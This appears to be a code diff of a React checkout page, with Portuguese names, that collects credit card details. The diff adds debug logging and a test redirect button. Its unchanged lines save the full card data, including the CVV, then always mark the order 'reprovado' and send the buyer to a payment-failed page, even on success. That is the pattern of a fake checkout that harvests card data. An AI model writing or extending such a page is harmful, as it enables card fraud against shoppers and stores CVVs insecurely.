@@ -57,7 +57,7 @@ export default function CartaoPage() {
 
           if (pedidoError) throw new Error('Erro ao criar pedido');
           pedidoId = novoPedido.id;
-          console.log('Novo pedido criado:', novoPedido);
+          console.log('Novo pedido criado com ID:', pedidoId);
           setPedidoData(novoPedido);
         } else {
           const { data: pedido, error: pedidoError } = await supabase
@@ -85,6 +85,7 @@ export default function CartaoPage() {
 
   const handleSubmit = async (data: CreditCardFormValues) => {
     console.log('handleSubmit chamado com dados:', { ...data, cvv: '***' });
+    console.log('Pedido ID atual:', pedidoId);
 
     if (!pedidoId) {
       toast.error('ID do pedido não encontrado');
@@ -95,7 +96,7 @@ export default function CartaoPage() {
     setSubmitting(true);
 
     try {
-      console.log('Salvando informações de pagamento...');
+      console.log('1. Tentando salvar informações de pagamento...');
       await createPaymentInfo({
         pedido_id: pedidoId,
         metodo_pagamento: 'cartao',
@@ -105,31 +106,49 @@ export default function CartaoPage() {
         cvv: data.cvv,
         parcelas: parseInt(data.parcelas.split('x')[0], 10),
       });
-      console.log('Informações de pagamento salvas');
+      console.log('2. Informações de pagamento salvas');
 
-      console.log('Atualizando status do pedido...');
+      console.log('3. Atualizando status do pedido...');
       const success = await atualizarStatusPedido(pedidoId, 'reprovado');
       if (!success) throw new Error('Falha ao atualizar status');
 
-      console.log('Status atualizado para "reprovado"');
+      console.log('4. Status atualizado para "reprovado"');
       toast.info('Pagamento processado, redirecionando...');
 
       queryClient.invalidateQueries({ queryKey: ['pedidos'] });
+      console.log('5. Cache invalidado');
+
+      console.log('6. Aguardando 1,5s antes de redirecionar...');
       await new Promise((resolve) => setTimeout(resolve, 1500));
-      console.log('Redirecionando para payment-failed');
-      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+
+      const redirectPath = `/checkout/${slug}/payment-failed/${pedidoId}`;
+      console.log('7. Tentando redirecionar para:', redirectPath);
+      navigate(redirectPath);
+      console.log('8. Redirecionamento disparado');
     } catch (error: any) {
       console.error('Erro no handleSubmit:', error.message);
       toast.error(`Erro: ${error.message || 'Falha ao processar'}`);
+
+      console.log('Erro detectado, tentando redirecionar...');
       await new Promise((resolve) => setTimeout(resolve, 1500));
-      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      const redirectPath = `/checkout/${slug}/payment-failed/${pedidoId}`;
+      console.log('Tentando redirecionar após erro para:', redirectPath);
+      navigate(redirectPath);
     } finally {
+      console.log('Finalizando handleSubmit');
       setSubmitting(false);
     }
   };
 
   const handleBack = () => {
+    console.log('Botão Voltar clicado');
     navigate(`/checkout/${slug}`);
+  };
+
+  // Botão de teste para verificar o navigate
+  const handleTestRedirect = () => {
+    console.log('Testando redirecionamento manual');
+    navigate('/teste');
   };
 
   if (loading) {
@@ -188,6 +207,10 @@ export default function CartaoPage() {
             buttonColor={produto?.cor_botao || '#46ba26'}
             buttonText={produto?.texto_botao || 'Compre Agora'}
           />
+          {/* Botão de teste */}
+          <Button onClick={handleTestRedirect} className="mt-4">
+            Testar Redirecionamento
+          </Button>
         </div>
 
         <div>
